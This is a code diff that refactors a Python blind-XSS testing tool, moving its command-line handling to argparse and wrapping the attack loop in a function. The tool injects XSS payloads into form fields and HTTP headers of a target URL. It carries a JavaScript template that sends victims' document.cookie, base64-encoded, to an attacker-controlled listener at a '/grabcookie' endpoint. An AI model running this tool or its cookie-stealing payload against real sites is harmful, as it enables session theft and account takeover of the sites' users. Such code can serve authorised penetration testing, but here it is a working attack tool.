@@ -5,6 +5,7 @@ import os
 import requests
 import json
 import urllib.parse
+import argparse
 
 '''
 Checks for HTML forms for blind XSS. 
@@ -91,6 +92,7 @@ escapes = {
     'keydoubquote': '>"'
 }
 
+'''
 if len(sys.argv) < 4:
     print(f'Usage: {sys.argv[0]} <target_url> <listener> <body> <fields> [-H] [payloads_file]\n'
           f'   ex. {sys.argv[0]} http://target.tld:8080/submitform http://12.34.56.78:8000\n'
@@ -112,14 +114,13 @@ FIELDS = sys.argv[4]
 TRY_HEADERS = True if (len(sys.argv) > 5 and sys.argv[5]) == '-H' else False
 PAYLOADS_FILE = sys.argv[6] if len(sys.argv) > 6 else None
 DEFAULT_UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
+'''
 
 DEBUG = True
 log_http_file = os.path.join(os.getcwd(), 'debug.log')
 log_html_file = os.path.join(os.getcwd(), 'debug.html')
 log_payloads_file = os.path.join(os.getcwd(), 'debug.lst')
 grabcookie_file = os.path.join(os.getcwd(), 'grabcookie.js')
-
-fields = FIELDS.split(',')
 
 grabcookie_javascript_template = r'''
 function urlSafeBase64Encode(data) {
@@ -133,21 +134,7 @@ function urlSafeBase64Encode(data) {
 new Image().src='#HOST#/grabcookie?b64='+urlSafeBase64Encode(document.cookie)
 '''
 
-if PAYLOADS_FILE is None:
-    payloads = default_payloads
-else:
-    try:
-        with open(PAYLOADS_FILE, 'r') as f:
-            payloads = json.load(f)
-    except json.JSONDecodeError as e:
-        print(f'Error occurred while parsing JSON:\n{e}\nDefaulting to built-in payloads.')
-        payloads = default_payloads
-    except FileNotFoundError as e:
-        print(f'The specified payloads JSON file was not found:\n{e}\nDefaulting to built-in payloads.')
-        payloads = default_payloads
-    except IOError as e:
-        print(f'An IO error occurred while reading the JSON payloads file:\n{e}. Exiting now.')
-        sys.exit(1)
+
 
 
 def spinner(idx, message, prescale=0, carriage_rtn='\r'):
@@ -161,21 +148,19 @@ def progress(complete, total):
     return f'{perc: >6.2f}%'
 
 
-def substitute_post_body(post_body, fields, payload_template, lbl_prefix):
+def do_xss(TARGET, LOCAL, BODY, fields, TRY_HEADERS, payloads, user_agent):
 
-    # Parse the POST body into a dictionary
-    parsed_body = urllib.parse.parse_qs(post_body)
-    # Substitute the values of the specified fields
-    for field in fields:
-        if field in parsed_body:
-            _payload = payload_template.replace('#LBL#',lbl_prefix+field.lower())
-            #print(f'Appending {field}={parsed_body[field]} with {[_payload]}')
-            parsed_body[field] += [_payload]
-    # Re-encode the dictionary back into x-www-form-urlencoded format
-    return urllib.parse.urlencode(parsed_body, doseq=True)
-
-
-if __name__ == "__main__":
+    def substitute_post_body(post_body, fields, payload_template, lbl_prefix):
+        # Parse the POST body into a dictionary
+        parsed_body = urllib.parse.parse_qs(post_body)
+        # Substitute the values of the specified fields
+        for field in fields:
+            if field in parsed_body:
+                _payload = payload_template.replace('#LBL#',lbl_prefix+field.lower())
+                #print(f'Appending {field}={parsed_body[field]} with {[_payload]}')
+                parsed_body[field] += [_payload]
+        # Re-encode the dictionary back into x-www-form-urlencoded format
+        return urllib.parse.urlencode(parsed_body, doseq=True)
 
     i = 0
     N = len(payloads) * len(escapes)
@@ -189,7 +174,7 @@ if __name__ == "__main__":
     if DEBUG:
         print('Debug mode is ENABLED: writing \n - payloads into debug.html \n - HTTP into debug.log \n - raw payloads into debug.lst')
         with open(log_html_file, 'w') as outfile:
-            outfile.write(f"<html><body>\n")
+            outfile.write(f"<!DOCTYLE HTML>\n<html><body>\n")
         with open(log_http_file, 'w') as logfile:
             logfile.write(f'Logging XSS attempts to {TARGET}\n---------------------------------\n')
         with open(log_payloads_file, 'w') as payloadsfile:
@@ -222,7 +207,7 @@ if __name__ == "__main__":
             else:
                 headers = {
                     'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': DEFAULT_UA
+                    'User-Agent': user_agent
                 }
             resp = requests.post(
                 url=TARGET,
@@ -242,3 +227,49 @@ if __name__ == "__main__":
     if DEBUG:
         with open(log_html_file, 'a') as outfile:
             outfile.write(f"</body></html>")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="A tool for testing XSS vulnerabilities in web forms."
+    )
+    parser.add_argument('target_url', type=str, 
+                        help='The target URL of the form to test (e.g., http://target.tld:8080/submitform)')
+    parser.add_argument('listener', type=str, 
+                        help='The attacker-controlled HTTP server (e.g., http://12.34.56.78:8000)')
+    parser.add_argument('body', type=str, 
+                        help='The copy-pasted example of the form POST request body')
+    parser.add_argument('fields', type=str, 
+                        help='A comma-separated (no spaces) list of fields to target for XSS')
+    parser.add_argument('-X', '--method', type=str, choices=['GET', 'POST'], default='POST',
+                        help='HTTP Method, currently supports only GET and POST (default: POST)')
+    parser.add_argument('-ua', '--user-agent', type=str, default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+                        help='User-Agent header to use (defaults to regular Firefox)')
+    parser.add_argument('-H', '--test-headers', action='store_true', 
+                        help='Try injecting payloads into HTTP headers too')
+    parser.add_argument('-p', '--payloads-file', type=str, default='', 
+                        help='File path to the JSON file with payloads (defaults to the payloads in shown in the script)')
+    
+    args = parser.parse_args()
+    
+    if args.payloads_file == '':
+        payloads = default_payloads
+    else:
+        try:
+            with open(args.payloads_file, 'r') as f:
+                payloads = json.load(f)
+        except json.JSONDecodeError as e:
+            print(f'Error occurred while parsing JSON:\n{e}\nDefaulting to built-in payloads.')
+            payloads = default_payloads
+        except FileNotFoundError as e:
+            print(f'The specified payloads JSON file was not found:\n{e}\nDefaulting to built-in payloads.')
+            payloads = default_payloads
+        except IOError as e:
+            print(f'An IO error occurred while reading the JSON payloads file:\n{e}. Exiting now.')
+            sys.exit(1)
+    
+    fields = args.fields.split(',')
+
+    do_xss(args.target_url, args.listener, args.body, fields, args.test_headers, payloads, args.user_agent)
+
+if __name__ == "__main__":
+    main()
